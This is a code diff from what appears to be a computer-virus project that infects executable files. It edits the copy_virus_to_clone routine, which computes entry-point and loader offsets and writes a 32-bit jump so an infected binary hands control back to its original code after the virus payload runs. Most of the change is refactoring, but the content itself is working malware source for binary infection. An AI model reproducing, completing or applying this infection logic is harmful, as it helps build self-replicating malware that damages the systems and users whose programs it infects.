@@ -1,6 +1,7 @@
 #include "virus.h"
 #include "disasm.h"
 #include "utils.h"
+#include "jumps.h"
 #include "compiler_utils.h"
 #include "errors.h"
 
@@ -22,15 +23,15 @@ bool		copy_virus_to_clone(struct safe_ptr clone_ref,
 	const size_t	client_entry_off = shoff + file_entry->offset_in_section;
 
 	// compute distances
-	const size_t	dist_client_loader_entry = loader_entry_off - client_entry_off;
-	const size_t	dist_client_entry_jump   = dist_client_loader_entry + vhdr->dist_client_loader;
+	const size_t	dist_jmpclient_loader_entry = loader_entry_off - client_entry_off;
+	const size_t	dist_client_entry_jump      = dist_jmpclient_loader_entry + vhdr->dist_jmpclient_loader;
 
 	// compute code offsets
 	const size_t	client_jump_off = client_entry_off + dist_client_entry_jump;
 	const int32_t	rel_jump_client = -((int32_t)dist_client_entry_jump + JUMP32_INST_SIZE);
 
 	// get safe pointers in clone
-	void	*back_to_client_jump = safe(clone_ref, client_jump_off, INSTRUCTION_MAXLEN);
+	const void	*back_to_client_jump = safe(clone_ref, client_jump_off, INSTRUCTION_MAXLEN);
 
 	// safe memory and overflow check
 	if (back_to_client_jump == NULL
@@ -38,7 +39,9 @@ bool		copy_virus_to_clone(struct safe_ptr clone_ref,
 		return errors(ERR_VIRUS, _ERR_V_COPY_VIRUS_TO_CLONE);
 
 	// write new addr into clone's loader code
-	write_jump(back_to_client_jump, rel_jump_client, DWORD);
+	const size_t	back_to_client_jump_offset = back_to_client_jump - clone_ref.ptr;
+
+	write_jmp32(clone_ref, back_to_client_jump_offset, rel_jump_client);
 
 	return true;
 }
